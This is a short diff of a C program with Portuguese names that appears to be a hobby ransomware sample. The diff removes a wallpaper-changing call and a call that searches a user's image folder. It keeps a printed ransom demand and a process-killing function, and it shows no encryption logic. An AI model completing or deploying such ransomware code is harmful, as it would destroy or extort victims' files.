@@ -11,8 +11,7 @@
 
 void  mudar_papel(){
 {
-	SystemParametersInfoA (SPI_SETDESKWALLPAPER, 0 , (PVOID)"C:\\Users\estan\\OneDrive\\Imagens\\Nova pasta imagem" , SPIF_SENDCHANGE); // SPIA para mudar o papel de parede :D
-}
+	  
 }
 
 void encerrar_processo(char *name){
@@ -158,5 +157,5 @@ int main(){
 //S3arch("C:\\");
 //mudar_papel();
 printf(" Seu computador foi infectado com ransoware pague o resgate para ter seus arquivos de volta");
-S3arch("C:\\Users\\estan\\OneDrive\\Imagens\\Nova pasta imagem");
+
 }
